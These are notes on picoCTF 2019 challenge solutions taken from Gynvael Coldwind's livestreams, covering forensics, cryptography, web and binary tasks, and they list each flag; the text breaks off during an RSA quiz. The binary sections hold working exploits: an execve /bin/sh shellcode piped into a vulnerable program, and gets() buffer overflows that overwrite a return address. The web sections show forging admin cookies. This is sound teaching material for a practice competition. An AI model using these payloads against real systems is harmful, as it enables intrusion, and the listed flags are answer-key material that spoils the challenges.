# Notes from Gynvael's Hacking Livestreams for PicoCTF Challenges

## Table of Contents

Title                                                                      | Category         | Points | Link to Gynvael's Stream
-------------------------------------------------------------------------- | ---------------- | ------ | ------------------------------
[The Factory’s Secret        ](#the-factorys-secret---general-skills)      | General          | 1      | 
[Glory of the Garden         ](#glory-of-the-garden---forensics)           | Forensics        | 50     | [Part 1 (33:36)](https://youtu.be/pYrGJuOUG7M?t=33m36s)
[Insp3ct0r                   ](#insp3ct0r---web-exploitation)              | Web              | 50     | [Part 1 (39:47)](https://youtu.be/pYrGJuOUG7M?t=39m47s)
[Let's Warm Up               ](#lets-warm-up---general-skills)             | General          | 50     | [Part 1 (48:19)](https://youtu.be/pYrGJuOUG7M?t=48m19s)
[The Numbers                 ](#the-numbers---cryptography)                | Crypto           | 50     | [Part 1 (50:26)](https://youtu.be/pYrGJuOUG7M?t=50m26s)
[Warmed Up                   ](#warmed-up---general-skills)                | General          | 50     | [Part 1 (1:00:06)](https://youtu.be/pYrGJuOUG7M?t=1h00m06s)
[2Warm                       ](#2warm---general-skills)                    | General          | 50     | [Part 1 (1:02:06)](https://youtu.be/pYrGJuOUG7M?t=1h02m06s)
[handy-shellcode             ](#handy-shellcode---binary-exploitation)     | Binary           | 50     | [Part 1 (1:05:30)](https://youtu.be/pYrGJuOUG7M?t=1h05m30s)
[practice-run-1              ](#practice-run-1---binary-exploitation)      | Binary           | 50     | [Part 1 (1:26:18)](https://youtu.be/pYrGJuOUG7M?t=1h26m18s)
[unzip                       ](#unzip---forensics)                         | Forensics        | 50     | [Part 1 (1:27:46)](https://youtu.be/pYrGJuOUG7M?t=1h27m46s)
[vault-door-training         ](#vault-door-training---reverse-engineering) | Reversing        | 50     | [Part 1 (1:30:02)](https://youtu.be/pYrGJuOUG7M?t=1h30m02s)
[13                          ](#13---cryptography)                         | Crypto           | 100    | [Part 1 (1:35:57)](https://youtu.be/pYrGJuOUG7M?t=1h35m57s)
[Bases                       ](#bases---general-skills)                    | General          | 100    | [Part 1 (1:38:50)](https://youtu.be/pYrGJuOUG7M?t=1h38m50s)
[Easy1                       ](#easy1---cryptography)                      | Crypto           | 100    | [Part 1 (1:47:50)](https://youtu.be/pYrGJuOUG7M?t=1h47m50s)
[First Grep                  ](#first-grep---general-skills)               | General          | 100    | [Part 1 (1:56:28)](https://youtu.be/pYrGJuOUG7M?t=1h56m28s)
[OverFlow 0                  ](#overflow-0---binary-exploitation)          | Binary           | 100    | [Part 1 (1:57:06)](https://youtu.be/pYrGJuOUG7M?t=1h57m06s)
[Resources                   ](#resources---general-skills)                | General          | 100    | [Part 1 (2:00:53)](https://youtu.be/pYrGJuOUG7M?t=2h00m53s)
[caesar                      ](#caesar----cryptography)                    | Crypto           | 100    | [Part 1 (2:01:28)](https://youtu.be/pYrGJuOUG7M?t=2h01m28s)
[dont-use-client-side        ](#dont-use-client-side---web-exploitation)   | Web              | 100    | [Part 1 (2:02:40)](https://youtu.be/pYrGJuOUG7M?t=2h02m40s)
[logon                       ](#logon---web-exploitation)                  | Web              | 100    | [Part 1 (2:05:42)](https://youtu.be/pYrGJuOUG7M?t=2h05m42s)
[strings it                  ](#strings-it---general-skills)               | General          | 100    | [Part 1 (2:11:07)](https://youtu.be/pYrGJuOUG7M?t=2h11m07s)
[vault-door-1                ](#vault-door-1---reverse-engineering)        | Reversing        | 100    | [Part 1 (2:13:31)](https://youtu.be/pYrGJuOUG7M?t=2h13m31s)
[what's a net cat            ](#whats-a-net-cat---general-skills)          | General          | 100    | [Part 1 (2:29:37)](https://youtu.be/pYrGJuOUG7M?t=2h29m37s)
[where are the robots        ](#where-are-the-robots---web-exploitation)   | Web              | 100    | [Part 1 (2:31:33)](https://youtu.be/pYrGJuOUG7M?t=2h31m33s)
[OverFlow 1                  ](#overflow-1---binary-exploitation)          | Binary           | 150    | [Part 1 (2:33:56)](https://youtu.be/pYrGJuOUG7M?t=2h33m56s)
[So Meta                     ](#so-meta---forensics)                       | Forensics        | 150    | [Part 1 (2:44:34)](https://youtu.be/pYrGJuOUG7M?t=2h44m34s)
[What Lies Within            ](#what-lies-within---forensics)              | Forensics        | 150    | [Part 1 (2:46:30)](https://youtu.be/pYrGJuOUG7M?t=2h46m30s)
[Extensions                  ](#extensions---forensics)                    | Forensics        | 150    | [Part 1 (3:08:03)](https://youtu.be/pYrGJuOUG7M?t=3h08m03s)
[shark on the wire 1         ](#shark-on-the-wire-1---forensics)           | Forensics        | 150    | [Part 1 (3:10:03)](https://youtu.be/pYrGJuOUG7M?t=3h10m03s)
[Based                       ](#based---general-skills)                    | General          | 200    | [Part 1 (3:20:40)](https://youtu.be/pYrGJuOUG7M?t=3h20m40s)
[Client-side-again           ](#client-side-again---web-exploitation)      | Web              | 200    | [Part 1 (3:25:29)](https://youtu.be/pYrGJuOUG7M?t=3h25m29s)
[First Grep: Part II         ](#first-grep-part-ii---general-skills)       | General          | 200    | [Part 1 (3:36:48)](https://youtu.be/pYrGJuOUG7M?t=3h36m48s)
[Flags                       ](#flags---cryptography)                      | Crypto           | 200    | [Part 1 (3:38:22)](https://youtu.be/pYrGJuOUG7M?t=3h38m22s)
[Mr-Worldwide                ](#mr-worldwide---cryptography)               | Crypto           | 200    | [Part 1 (3:44:54)](https://youtu.be/pYrGJuOUG7M?t=3h44m54s)
[Open-to-admins              ](#open-to-admins---web-exploitation)         | Web              | 200    | [Part 1 (4:05:34)](https://youtu.be/pYrGJuOUG7M?t=4h05m34s)
[Tapping                     ](#tapping---cryptography)                    | Crypto           | 200    | [Part 1 (4:21:28)](https://youtu.be/pYrGJuOUG7M?t=4h21m28s)
[la cifra de                 ](#la-cifra-de---cryptography)                | Crypto           | 200    | [Part 1 (4:23:14)](https://youtu.be/pYrGJuOUG7M?t=4h23m14s)

## Credits
All the credit goes to [Gynvael Coldwind](https://www.youtube.com/channel/UCCkVMojdBWS-JtH7TliWkVg) for making these streams. Check him out.  
I based the table format above on [this](https://github.com/shiltemann/CTF-writeups-public/blob/master/PicoCTF_2018/writeup.md#overview).

## The Factory's Secret - General Skills
Gynvael gave up on this. Maybe it was too easy.

## Glory of the Garden - Forensics
```
$ file garden.jpg # This is to confirm that this file is actually a jpg
garden.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, baseline, precision 8, 2999x2249, frames 3
$ ls -la garden.jpg # Check size
-rw-rw-rw- 1 root root 2295192 Sep 28  2019 garden.jpg
$ strings garden.jpg | grep pico # Look for the string “pico” in the file
Here is a flag "picoCTF{more_than_m33ts_the_3y3b7FBD20b}"
```
Grep to win (used in super easy challenges or badly prepared challenges

## Insp3ct0r - Web Exploitation
Just use “view page source”

## Let's Warm Up - General Skills 
Just use an online ascii table or hex to ascii converter or the following
```
$ python
>>> chr(0x70)
'p'
```
or just `man ascii` 

## The Numbers - Cryptography 
There are only numbers no larger than 26 so the numbers just stand for the index of each letter in the alphabet. Manually do it or use this script from Gynvael:
```
import string
a = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
k = [16, 9, 3, 15, 3, 20, 6, 20, 8, 5, 14, 21, 13, 2, 5, 18, 19, 13, 1, 19, 15, 14]

# We don't know if the index starts at 0 or 1
print(''.join([a[n-1] for n in k]))
print(''.join([a[n] for n in k]))
```

## Warmed Up - General Skills
0x3D to base 10

```
0x3        +      0xD =
3 * 16    +      0xD =
48         +      0xD =
48         +      13   =
61
```

## 2Warm - General Skills 
```
$ python
>>> bin(42)
'0b101010'
```
or use math and do it the long way
```
2 * 16  =  0x20  = 32 
3 * 16  =  0x30  =  48

So 42 in decimal is 0x2A

Powers of 2: 8421

2      A
01    1010
```
## handy-shellcode - Binary Exploitation 
Connect to the shell server
```
$ ls -la  /problems/handy-shellcode_4_037bd47611d842b565cfa1f378bfd8d9
total 732
drwxr-xr-x   2 root       root                4096 Sep 28  2019 .
drwxr-x--x 684 root       root               69632 Oct 10  2019 ..
-r--r-----   1 hacksports handy-shellcode_4     39 Sep 28  2019 flag.txt
-rwxr-sr-x   1 hacksports handy-shellcode_4 661832 Sep 28  2019 vuln
-rw-rw-r--   1 hacksports hacksports           624 Sep 28  2019 vuln.c
```
The gets() function is the vulnerable part of the code. This means we can use any character except '\n' or 0x0A
```
 void vuln(char *buf){
 	gets(buf);
  puts(buf);
}
```

In main(), this line runs the input
```
((void (*)())buf)();
```

If we just run the program and put in random input like asdf, the program will crash since asdf aren't valid instruction that can be executed
```
$ ./vuln
Enter your shellcode:
asdf
asdf
Thanks! Executing now...
Segmentation fault (core dumped)
```
As we can see, the program just segfaults.


However, if we use 0xC3 as the input, the program will run without crashing since 0xC3 is the 'ret' assembly instruction, so when we run the program with it as input, the program should exit without crashing.
```
$ echo -e '\xC3' | ./vuln 
```

This confirms our assumptions of how the program runs. According to Gynvael, exploitation is a process where "everything can go wrong," so it's good to work with small steps to make sure our assumptions are correct.

Find out what architecture the shellcode should be:
```
$ file vuln
vuln: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=7b65fbf1fba331b6b09a6812a338dbb1118e68e9, not stripped
```
This shows us that the program is a 32 bit program running on x86 Linux. 

To find some shellcode just google "x86 32 linux shellcode"
We find some shellcode for spawning a shell [here](http://shell-storm.org/shellcode/files/shellcode-827.php)
```
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
```

Let's give vuln the shellcode as input
```
$ echo -e '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80` | ./vuln
Enter your shellcode:
1Ph//shh/binPS
Thanks! Executing now...
```
The shellcode above doesn't seem to work, but it actually does. The program just exits after successfully running the shellcode and spawning a shell. In order to interact with the shell, we need to keep stdin open.
```
$ (echo -e '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80`; cat) | ./vuln
Enter your shellcode:
1Ph//shh/binPS
Thanks! Executing now...
ls
flag.txt  vuln  vuln.c
cat flag.txt
picoCTF{h4ndY_d4ndY_sh311c0d3_55c521fe}
```
Gynvael saves his shellcode to a file and then uses `cat shellcode - | ./vuln` instead but the above does the same thing.

## practice-run-1 - Binary Exploitation 
Login to the shell server and just run the binary
```
$ cd /problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e
$ ls -la
total 84
drwxr-xr-x   2 root       root              4096 Sep 28  2019 .
drwxr-x--x 684 root       root             69632 Oct 10  2019 ..
-rwxr-sr-x   1 hacksports practice-run-1_0  7252 Sep 28  2019 run_this
$ ./run_this
picoCTF{g3t_r3adY_2_r3v3r53}
```

## unzip - Forensics 
```
$ file flag.zip
flag.zip: Zip archive data, at least v2.0 to extract
$ strings flag.zip | grep pico # Grep2win doesn't work
$ unzip flag.zip
Archive:  flag.zip
  inflating: flag.png
$ ls
flag.png  flag.zip
```
The flag is in flag.png

## vault-door-training - Reverse Engineering 
The flag is in the source code

## 13 - Cryptography 
Just use a ROT13 decrypter
ROT13 is just a simple cipher.
Gynvael suggests implementing it if you haven't already; otherwise just use a decrypter online like [https://rot13.com/]. Time counts on CTFs, so just use the fastest method.

## Bases - General Skills 
Convert from Base64
Base64 is used to encode binary to a printable text

Python2
```
$ python
>>> "bDNhcm5fdGgzX3IwcDM1".decode("base64")
'l3arn_th3_r0p35'
```

Python3
```
$ python3
>>> import base64
base64.b64decode("bDNhcm5fdGgzX3IwcDM1")
b'l3arn_th3_r0p35'
```

## Easy1 - Cryptography 
Basic substitution cipher [Vigenère cipher](https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher)
Use the table

## First Grep - General Skills 
Grep to win
```
$ cat file | grep pico
picoCTF{grep_is_good_to_find_things_ad4e9645}
```

## OverFlow 0 - Binary Exploitation 
This line of code means the  sigsegv_handler() function is called when the program crashes.
```
signal(SIGSEGV, sigsegv_handler);
```

We just have to crash the program to get the flag read to us:
```
void sigsegv_handler(int sig) {
  fprintf(stderr, "%s\n", flag); // This prints our flag
  fflush(stderr);
  exit(1);
}
```

To crash the program, just overflow the buffer by sending in more than buffer length
```
$ ./vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
picoCTF{3asY_P3a5y1fcf81f9}
```

## Resources - General Skills 
Just go to the link and scroll down

## caesar  - Cryptography 
Caesar cipher is basically rot-n where n is a number. Use an online decoder like [http://theblob.org/rot.cgi]. 

## dont-use-client-side - Web Exploitation 
```
<script type="text/javascript">
  function verify() {
    checkpass = document.getElementById("pass").value;
    split = 4;
    if (checkpass.substring(0, split) == 'pico') {
      if (checkpass.substring(split*6, split*7) == 'b956') {
        if (checkpass.substring(split, split*2) == 'CTF{') {
         if (checkpass.substring(split*4, split*5) == 'ts_p') {
          if (checkpass.substring(split*3, split*4) == 'lien') {
            if (checkpass.substring(split*5, split*6) == 'lz_e') {
              if (checkpass.substring(split*2, split*3) == 'no_c') {
                if (checkpass.substring(split*7, split*8) == 'b}') {
                  alert("Password Verified")
                  }
                }
              }
      
            }
          }
        }
      }
    }
    else {
      alert("Incorrect password");
    }
    
  }
</script>
```
Just sort the substrings in order and then add them all to form the completed flag.

## logon - Web Exploitation 
Set the admin cookie to True

## strings it - General Skills 
Another grep to win
```
$ strings strings | grep pico
picoCTF{5tRIng5_1T_c611cac7}
```

## vault-door-1 - Reverse Engineering 
Just sort the charAt() by indexes and combine the characters into the completed string.
```
password.charAt(0)  == 'd'
password.charAt(29) == '7'
password.charAt(4)  == 'r'
password.charAt(2)  == '5'
password.charAt(23) == 'r'
password.charAt(3)  == 'c'
password.charAt(17) == '4'
password.charAt(1)  == '3'
password.charAt(7)  == 'b'
password.charAt(10) == '_'
password.charAt(5)  == '4'
password.charAt(9)  == '3'
password.charAt(11) == 't'
password.charAt(15) == 'c'
password.charAt(8)  == 'l'
password.charAt(12) == 'H'
password.charAt(20) == 'c'
password.charAt(14) == '_'
password.charAt(6)  == 'm'
password.charAt(24) == '5'
password.charAt(18) == 'r'
password.charAt(13) == '3'
password.charAt(19) == '4'
password.charAt(21) == 'T'
password.charAt(16) == 'H'
password.charAt(27) == '3'
password.charAt(30) == 'a'
password.charAt(25) == '_'
password.charAt(22) == '3'
password.charAt(28) == 'b'
password.charAt(26) == '0'
password.charAt(31) == '0'
```

## what's a net cat - General Skills 
```
$ nc -v 2019shell1.picoctf.com 37851
Connection to 2019shell1.picoctf.com 37851 port [tcp/*] succeeded!
You're on your way to becoming the net cat master
picoCTF{nEtCat_Mast3ry_628e0244}
```  

## where are the robots - Web Exploitation 
Go to the robots.txt
You'll find that there is a 'secret' webpage: /8e32f.html
You'll find the flag there

The robots.txt is a "sign" to tell web crawlers and search engines like Google not to index or go to those webpages

## OverFlow 1 - Binary Exploitation
 Check what type of binary this is
```
$ file vuln
vuln: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=5d4cdc8dc51fb3e5d45c2a59c6a9cd7958382fc9, not stripped
```

The vulnerable part of the code is the  `gets(buf);` in the vuln() function:
```
void vuln(){
  char buf[BUFFSIZE];
  gets(buf);

  printf("Woah, were jumping to 0x%x !\n", get_return_address());
}
```

The source code already has a flag() function helpfully placed in the program to read the flag out to us:
```
void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}
```

We just have to overwrite the return address with the address of flag.

Get the address of flag
```
$ objdump -d ./vuln | grep flag
080485e6 <flag>:
 8048618:       75 1c                   jne    8048636 <flag+0x50>
```
The address of the flag() function is 0x80485e6

Intel x86 uses little endian so use e6 85 04 08  when overwriting the ret address

```
$ echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDD\xe6\x85\x04\x08' | ./vuln
Give me a string and lets see what happens:
Woah, were jumping to 0x80485e6 !
picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5fe1ff3d8}Segmentation fault (core dumped)
```
We use more than 64 bytes because there's some padding and other stuff we have to overwrite before we hit the return address (like the saved EBP). Experiment with different amounts of A's to see how many bytes are needed to reach the ret address.

## So Meta - Forensics 
Grep to win
```
$ strings  pico_img.png | grep pico
picoCTF{s0_m3ta_43f253bb}
```

or use exiftool to look at metadata
```
$ exiftool pico_img.png | grep pico
File Name                       : pico_img.png
Artist                          : picoCTF{s0_m3ta_43f253bb}
```

## What Lies Within - Forensics
```
$ strings buildings.png | grep pico # Always grep to win
$ file buildings.png
buildings.png: PNG image data, 657 x 438, 8-bit/color RGBA, non-interlaced
$ exiftool buildings.png # Check the metadata
ExifTool Version Number         : 10.80
File Name                       : buildings.png
Directory                       : .
File Size                       : 611 kB
File Modification Date/Time     : 2019:09:28 10:54:24-04:00
File Access Date/Time           : 2020:05:05 16:41:04-04:00
File Inode Change Date/Time     : 2020:05:05 16:41:04-04:00
File Permissions                : rw-rw-rw-
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 657
Image Height                    : 438
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Image Size                      : 657x438
Megapixels                      : 0.288
```
Gynvael tries editing the headers to see if there are any hidden rows, opening in GIMP to see if any of the channels have data, and tries adjusting the color curves.

LSB (Least Significant Bit) Steganography turns out to be the solution. 

Data is hidden using the least significant bit. E.g. for a color 0x31708f, the f could be changed to a b to store data. The small change in color is not really noticeable.

Use an online [decoder](https://stylesuxx.github.io/steganography/). If you've never implemented LSB steg, then that's another thing you should implement according to Gynvael.

## Extensions - Forensics
```
$ strings flag.txt | grep pico # Grep to win
$ file flag.txt
flag.txt: PNG image data, 1697 x 608, 8-bit/color RGB, non-interlaced
$ mv flag.txt flag.png # Change the extension to a png
```
Just change the extension and open the image

## shark on the wire 1 - Forensics
Use wireshark

Gynvael does the following: 

Filter packet bytes string pico
Notice that there are UDP packets with length 1 that seem to contain one character of the flag. Filter for UPD packets of length 1. Filter again with 10.0.0.2 since that is the IP address that seems to be associated with the flag data.

Gynvael then just uses "Follow UDP stream" to find the flag

## Based - General Skills 
Just convert binary to ascii, decimal to ascii, and octal to ascii, etc.
```
$ python
>>> list = "146 141 154 143 157 156"
>>> base = 8
>>> ''.join([chr(int(x, base)) for x in list.split(" ")]) # Converts base to ascii
'falcon'
>>> "7461626c65".decode('hex') # Converts hex to ascii
'table'
```

Converting hex to ascii in python3
```
$ python
>>> bytes.fromhex("7461626c65")
b'table'
```

## Client-side-again - Web Exploitation 
Look at the verify() function in the javascript
```
function verify() {
    checkpass = document[_0x4b5b('0x0')]('pass')[_0x4b5b('0x1')];
    split = 0x4;
    if (checkpass[_0x4b5b('0x2')](0x0, split * 0x2) == _0x4b5b('0x3')) {
        if (checkpass[_0x4b5b('0x2')](0x7, 0x9) == '{n') {
            if (checkpass[_0x4b5b('0x2')](split * 0x2, split * 0x2 * 0x2) == _0x4b5b('0x4')) {
                if (checkpass[_0x4b5b('0x2')](0x3, 0x6) == 'oCT') {
                    if (checkpass[_0x4b5b('0x2')](split * 0x3 * 0x2, split * 0x4 * 0x2) == _0x4b5b('0x5')) {
                        if (checkpass['substring'](0x6, 0xb) == 'F{not') {
                            if (checkpass[_0x4b5b('0x2')](split * 0x2 * 0x2, split * 0x3 * 0x2) == _0x4b5b('0x6')) {
                                if (checkpass[_0x4b5b('0x2')](0xc, 0x10) == _0x4b5b('0x7')) {
                                    alert(_0x4b5b('0x8'));
                                }
                            }
                        }
                    }
                }
            }
        }
    } else {
        alert(_0x4b5b('0x9'));
    }
}
```
Isolate only the if cases
```
if (checkpass[_0x4b5b('0x2')](0x0, split * 0x2) == _0x4b5b('0x3'))
if (checkpass[_0x4b5b('0x2')](0x7, 0x9) == '{n')
if (checkpass[_0x4b5b('0x2')](split * 0x2, split * 0x2 * 0x2) == _0x4b5b('0x4'))
if (checkpass[_0x4b5b('0x2')](0x3, 0x6) == 'oCT')
if (checkpass[_0x4b5b('0x2')](split * 0x3 * 0x2, split * 0x4 * 0x2) == _0x4b5b('0x5'))
if (checkpass['substring'](0x6, 0xb) == 'F{not')
if (checkpass[_0x4b5b('0x2')](split * 0x2 * 0x2, split * 0x3 * 0x2) == _0x4b5b('0x6'))
if (checkpass[_0x4b5b('0x2')](0xc, 0x10) == _0x4b5b('0x7'))
```

Replace split with 0x4 since we know split = 0x4
```
if (checkpass[_0x4b5b('0x2')](0x0, 0x4 * 0x2) == _0x4b5b('0x3'))
if (checkpass[_0x4b5b('0x2')](0x7, 0x9) == '{n')
if (checkpass[_0x4b5b('0x2')](0x4 * 0x2, 0x4 * 0x2 * 0x2) == _0x4b5b('0x4'))
if (checkpass[_0x4b5b('0x2')](0x3, 0x6) == 'oCT')
if (checkpass[_0x4b5b('0x2')](0x4 * 0x3 * 0x2, 0x4 * 0x4 * 0x2) == _0x4b5b('0x5'))
if (checkpass['substring'](0x6, 0xb) == 'F{not')
if (checkpass[_0x4b5b('0x2')](0x4 * 0x2 * 0x2, 0x4 * 0x3 * 0x2) == _0x4b5b('0x6'))
if (checkpass[_0x4b5b('0x2')](0xc, 0x10) == _0x4b5b('0x7'))
```

Do math and simplify
```
if (checkpass[_0x4b5b('0x2')](0, 8) == _0x4b5b('0x3'))
if (checkpass[_0x4b5b('0x2')](7, 9) == '{n')
if (checkpass[_0x4b5b('0x2')](8, 16) == _0x4b5b('0x4'))
if (checkpass[_0x4b5b('0x2')](3, 6) == 'oCT')
if (checkpass[_0x4b5b('0x2')](24, 32) == _0x4b5b('0x5'))
if (checkpass['substring'](6, 11) == 'F{not')
if (checkpass[_0x4b5b('0x2')](16, 24) == _0x4b5b('0x6'))
if (checkpass[_0x4b5b('0x2')](12, 16) == _0x4b5b('0x7'))
```

We can use the javascript console to figure out that _0x4b5b('0x2') is just substring so all the checkpass[_0x4b5b('0x2')] can be replaced with checkpass['substring']
```
if (checkpass['substring'](0, 8) == _0x4b5b('0x3'))
if (checkpass['substring'](7, 9) == '{n')
if (checkpass['substring'](8, 16) == _0x4b5b('0x4'))
if (checkpass['substring'](3, 6) == 'oCT')
if (checkpass['substring'](24, 32) == _0x4b5b('0x5'))
if (checkpass['substring'](6, 11) == 'F{not')
if (checkpass['substring'](16, 24) == _0x4b5b('0x6'))
if (checkpass['substring'](12, 16) == _0x4b5b('0x7'))
```

Remove redundant checks
```
if (checkpass['substring'](0, 8) == _0x4b5b('0x3'))
if (checkpass['substring'](8, 16) == _0x4b5b('0x4'))
if (checkpass['substring'](24, 32) == _0x4b5b('0x5'))
if (checkpass['substring'](16, 24) == _0x4b5b('0x6'))
```

Use the javascript console to figure out what _0x4b5b('0x3') and so on are.
```
if (checkpass['substring'](0, 8) == "picoCTF{")
if (checkpass['substring'](8, 16) == "not_this")
if (checkpass['substring'](24, 32) == "9d025}")
if (checkpass['substring'](16, 24) == "_again_3")
``` 

Piece the flag together using above:
picoCTF{not_this_again_39d025}

## First Grep: Part II - General Skills 
```
$ rgrep pico
files1/file22:picoCTF{grep_r_to_find_this_af11356f}
```

## Flags - Cryptography 
Just use a navy flags chart [International Code of Signals](https://en.wikipedia.org/wiki/International_Code_of_Signals).  
Flag is all CAPS

## Mr-Worldwide - Cryptography 
First letter of city names of the GPS coordinates.

## Open-to-admins - Web Exploitation 
Gynvael adds an admin="True" cookie, but it doesn't do anything.  
Gynvael looks at session data.

But it turns out you just had to set the cookies:
In the javascript console
```
> document.cookie="time=1400"
> document.cookie="admin=True"
```

## Tapping - Cryptography 
Just use a morse code [decoder](http://www.unit-conversion.info/texttools/morse-code/).

All uppercase
```
python
>>> "picoctf{m0rs3c0d31sfun1818224575}".upper()
PICOCTF{M0RS3C0D31SFUN1818224575}
```

## la cifra de - Cryptography 
It uses the Vigenère cipher. Just use an online [decoder](https://www.guballa.de/vigenere-solver) using English. 

## picobrowser - Web Exploitation
Change the user agent to picobrowser  
Use Chrome DevTools and create a new emulated device with user agent string "picobrowser"

or use curl
```
$ curl -A picobrowser https://2019shell1.picoctf.com/problem/12255/flag | grep "pico"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2115  100  2115    0     0  11882      0 --:--:-- --:--:-- --:--:-- 11815
         <!-- <strong>Title</strong> --> picobrowser!
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{p1c0_s3cr3t_ag3nt_bbe8a517}</code></p>
```

## plumbing - General Skills
```
$ nc -v 2019shell1.picoctf.com 21957 | grep pico
Connection to 2019shell1.picoctf.com 21957 port [tcp/*] succeeded!
picoCTF{digital_plumb3r_c1082838}
```
## rsa-pop-quiz - Cryptography

You must know [RSA](https://en.wikipedia.org/wiki/RSA_(cryptosystem)) for this task, but "it's really simple."

Connect to the quiz using netcat:
```
$ nc -v 2019shell1.picoctf.com 61751
Connection to 2019shell1.picoctf.com 61751 port [tcp/*] succeeded!
Good morning class! It's me Ms. Adleman-Shamir-Rivest
Today we will be taking a pop quiz, so I hope you studied. Cramming just will not do!
You will need to tell me if each example is possible, given your extensive crypto knowledge.
Inputs and outputs are in decimal. No hex here!
```
#### Question 1:
```
#### NEW PROBLEM ####
q : 60413
p : 76753
##### PRODUCE THE FOLLOWING ####
n
IS THIS POSSIBLE and FEASIBLE? (Y/N):y
#### TIME TO SHOW ME WHAT YOU GOT! ###
n:
```

It's possible to calculate n since `n = q*p`.  
Solve for n:
```
$ python
>>> q = 60413
>>> p = 76753
>>> n = q*p
>>> n
4636878989
```

#### Question 2: 
```
#### NEW PROBLEM ####
p : 54269
n : 5051846941
##### PRODUCE THE FOLLOWING ####
q
IS THIS POSSIBLE and FEASIBLE? (Y/N):y
#### TIME TO SHOW ME WHAT YOU GOT! ###
q:
```

Just use `q = n/p` and some python.

```
$ python
>>> 5051846941/54269
93089
```

#### Question 3:
```
#### NEW PROBLEM ####
e : 3
n : 12738162802910546503821920886905393316386362759567480839428456525224226445173031635306683726182522494910808518920409019414034814409330094245825749680913204566832337704700165993198897029795786969124232138869784626202501366135975223827287812326250577148625360887698930625504334325804587329905617936581116392784684334664204309771430814449606147221349888320403451637882447709796221706470239625292297988766493746209684880843111138170600039888112404411310974758532603998608057008811836384597579147244737606088756299939654265086899096359070667266167754944587948695842171915048619846282873769413489072243477764350071787327913
##### PRODUCE THE FOLLOWING ####
q
p
IS THIS POSSIBLE and FEASIBLE? (Y/N):n
```

n is quite large (2049 bytes), so factoring n to try and get the prime numbers (p and q) would be take way too long. There's no fast way to factor n. 

#### Question 4:
```
#### NEW PROBLEM ####
q : 66347
p : 12611
##### PRODUCE THE FOLLOWING ####
totient(n)
IS THIS POSSIBLE and FEASIBLE? (Y/N):y
#### TIME TO SHOW ME WHAT YOU GOT! ###
totient(n):
```
Use this equation `totient(n) = (q-1)*(p-1)` and python to calculate it

```
$ python
>>> ( 66347-1)*(12611-1)
836623060
```


#### Question 5:
```
#### NEW PROBLEM ####
plaintext : 6357294171489311547190987615544575133581967886499484091352661406414044440475205342882841236357665973431462491355089413710392273380203038793241564304774271529108729717
e : 3
n : 29129463609326322559521123136222078780585451208149138547799121083622333250646678767769126248182207478527881025116332742616201890576280859777513414460842754045651093593251726785499360828237897586278068419875517543013545369871704159718105354690802726645710699029936754265654381929650494383622583174075805797766685192325859982797796060391271817578087472948205626257717479858369754502615173773514087437504532994142632207906501079835037052797306690891600559321673928943158514646572885986881016569647357891598545880304236145548059520898133142087545369179876065657214225826997676844000054327141666320553082128424707948750331
##### PRODUCE THE FOLLOWING ####
ciphertext
IS THIS POSSIBLE and FEASIBLE? (Y/N):y
```
Encryption: `Ciphertext = plaintext^e mod n`

Use python:
```
$ python
>>> m = 6357294171489311547190987615544575133581967886499484091352661406414044440475205342882841236357665973431462491355089413710392273380203038793241564304774271529108729717
>>> e = 3
>>> n = 29129463609326322559521123136222078780585451208149138547799121083622333250646678767769126248182207478527881025116332742616201890576280859777513414460842754045651093593251726785499360828237897586278068419875517543013545369871704159718105354690802726645710699029936754265654381929650494383622583174075805797766685192325859982797796060391271817578087472948205626257717479858369754502615173773514087437504532994142632207906501079835037052797306690891600559321673928943158514646572885986881016569647357891598545880304236145548059520898133142087545369179876065657214225826997676844000054327141666320553082128424707948750331
>>> c = pow(m, e, n)
>>> c
256931246631782714357241556582441991993437399854161372646318659020994329843524306570818293602492485385337029697819837182169818816821461486018802894936801257629375428544752970630870631166355711254848465862207765051226282541748174535990314552471546936536330397892907207943448897073772015986097770443616540466471245438117157152783246654401668267323136450122287983612851171545784168132230208726238881861407976917850248110805724300421712827401063963117423718797887144760360749619552577176382615108244813L
```

#### Question 6:
```
#### NEW PROBLEM ####
ciphertext : 107524013451079348539944510756143604203925717262185033799328445011792760545528944993719783392542163428637172323512252624567111110666168664743115203791510985709942366609626436995887781674651272233566303814979677507101168587739375699009734588985482369702634499544891509228440194615376339573685285125730286623323
e : 3
